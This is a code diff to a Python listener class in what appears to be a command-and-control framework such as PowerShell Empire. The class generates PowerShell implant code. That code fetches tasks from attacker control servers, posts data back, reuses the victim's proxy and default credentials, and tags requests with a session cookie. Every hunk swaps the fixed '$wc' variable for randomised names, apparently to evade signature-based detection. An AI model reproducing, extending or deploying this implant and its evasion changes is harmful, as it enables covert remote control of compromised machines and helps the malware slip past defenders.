@@ -565,22 +565,22 @@ class Listener:
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                 }
 
-                                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
-                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
-                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
                             }
                         }
@@ -608,21 +608,21 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $wc.Proxy = $Script:Proxy;
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                 }
 
-                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                                 try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
